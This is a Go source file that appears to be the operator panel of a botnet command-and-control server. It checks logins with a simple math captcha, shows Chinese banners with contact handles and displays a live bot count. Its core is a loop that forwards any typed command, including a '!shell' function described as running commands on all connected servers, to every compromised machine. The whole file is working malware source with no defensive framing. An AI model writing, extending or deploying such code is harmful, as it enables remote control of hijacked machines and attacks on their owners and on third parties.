package main

import (
	"bufio"
	"net"
	"strconv"
	"strings"
	"time"
)

type Server struct {
	Connection net.Conn
}

func NewServer(connection net.Conn) *Server {
	return &Server{
		Connection: connection,
	}
}

func (server *Server) WriteString(data string) {
	var strToBytes []byte = []byte(data)
	server.Connection.Write(strToBytes)
}

func (server *Server) Colored(colorCode int, data string) {
	coloredText := ColoredText(colorCode, data)
	server.WriteString(coloredText)
}

func (server *Server) ClearScreen() {
	server.WriteString(CLEAR_SCREEN)
}

func (server *Server) ReadLine() (string, error) {
	bufioReader := bufio.NewReader(server.Connection)
	contents, err := bufioReader.ReadString('\n')
	contents = strings.TrimSpace(contents)
	return contents, err
}

func (server *Server) ShowBot() {
	for {
		botCount := botList.BotCounter()
		server.WriteString("\033]0;Servers: " + strconv.Itoa(botCount) + "\007")
		time.Sleep(1 * time.Second)
	}
}

func (server *Server) Handle() {
	defer server.Connection.Close()
	numberOne, numberTwo := GenerateCaptcha(1, 10)
	var captcha string = strconv.Itoa(numberOne) + " + " + strconv.Itoa(numberTwo) + " = "
	server.WriteString(captcha)
	result, err := server.ReadLine()
	if err != nil {
		return
	}
	resultInt, err := strconv.Atoi(result)
	if err != nil {
		return
	}
	if resultInt != numberOne+numberTwo {
		server.WriteString("Incorrect captcha.\r\n")
		return
	}
	go server.ShowBot()
	server.ClearScreen()
	server.WriteString("\r\n\r\n")
	server.Colored(91, "歡迎來到服務器控制器\r\n")
	server.Colored(91, "請遵守規則\r\n")
	server.Colored(91, "聯繫人：@timeouts1312\r\n")
	server.WriteString("\r\n\r\n")
	for {
		server.Colored(31, "行政@Botnet~$ ")
		command, err := server.ReadLine()
		if err != nil {
			break
		}
		if command == "" {
			continue
		}
		if command == "?" {
			server.Colored(91, "\r\n")
			server.Colored(91, "!shell: 在所有連接的服務器上執行命令\r\n")
			server.Colored(91, "\r\n")
		}
		if command == "clear" {
			server.ClearScreen()
			server.WriteString("\r\n\r\n")
			server.Colored(91, "歡迎來到服務器控制器\r\n")
			server.Colored(91, "請遵守規則\r\n")
			server.Colored(91, "聯繫人：@ryonos007、@timeouts1312、@iis700\r\n")
			server.WriteString("\r\n\r\n")
		}
		if command == "bots" {
			botCount := botList.BotCounter()
			server.Colored(91, "Servers: "+strconv.Itoa(botCount)+"\r\n")
			continue
		}
		botList.SendCommand(command)
	}
}
